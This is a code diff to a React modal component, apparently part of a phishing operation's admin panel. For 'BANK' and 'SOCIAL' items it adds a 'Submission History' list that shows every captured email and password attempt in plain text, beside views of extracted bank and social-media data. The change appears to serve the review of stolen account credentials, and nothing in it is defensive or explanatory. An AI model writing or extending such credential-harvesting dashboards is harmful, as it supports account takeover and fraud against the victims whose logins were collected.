@@ -331,6 +331,7 @@ export const ItemDetailsModal = ({
 
       case 'BANK':
         const bankData = safeParseJSON(data.banks) || [];
+        const bankHistory = safeParseJSON(data.history) || [];
         return (
           <div className="space-y-4">
             {headerCard}
@@ -350,11 +351,29 @@ export const ItemDetailsModal = ({
               </div>
             ))}
             {data.bankExtract && <BankExtractView data={data.bankExtract} />}
+            {Array.isArray(bankHistory) && bankHistory.length > 0 && (
+              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded">
+                <h3 className="font-medium text-gray-900 dark:text-white mb-2">
+                  Submission History ({bankHistory.length})
+                </h3>
+                <ul className="space-y-1">
+                  {bankHistory.map((trial: any, index: number) => (
+                    <li key={index} className="text-sm dark:text-gray-200">
+                      <span className="text-gray-500 dark:text-gray-400">#{index + 1}:</span>{' '}
+                      <span className="font-medium">{trial?.email || 'N/A'}</span>
+                      <span className="text-gray-500 dark:text-gray-400"> / </span>
+                      <span className="font-medium">{trial?.password || '—'}</span>
+                    </li>
+                  ))}
+                </ul>
+              </div>
+            )}
           </div>
         );
 
       case 'SOCIAL':
         const socialData = safeParseJSON(data.socials) || [];
+        const socialHistory = safeParseJSON(data.history) || [];
         return (
           <div className="space-y-4">
             {headerCard}
@@ -374,6 +393,23 @@ export const ItemDetailsModal = ({
               </div>
             ))}
             {data.socialExtract && <SocialExtractView data={data.socialExtract} />}
+            {Array.isArray(socialHistory) && socialHistory.length > 0 && (
+              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded">
+                <h3 className="font-medium text-gray-900 dark:text-white mb-2">
+                  Submission History ({socialHistory.length})
+                </h3>
+                <ul className="space-y-1">
+                  {socialHistory.map((trial: any, index: number) => (
+                    <li key={index} className="text-sm dark:text-gray-200">
+                      <span className="text-gray-500 dark:text-gray-400">#{index + 1}:</span>{' '}
+                      <span className="font-medium">{trial?.email || 'N/A'}</span>
+                      <span className="text-gray-500 dark:text-gray-400"> / </span>
+                      <span className="font-medium">{trial?.password || '—'}</span>
+                    </li>
+                  ))}
+                </ul>
+              </div>
+            )}
           </div>
         );
 
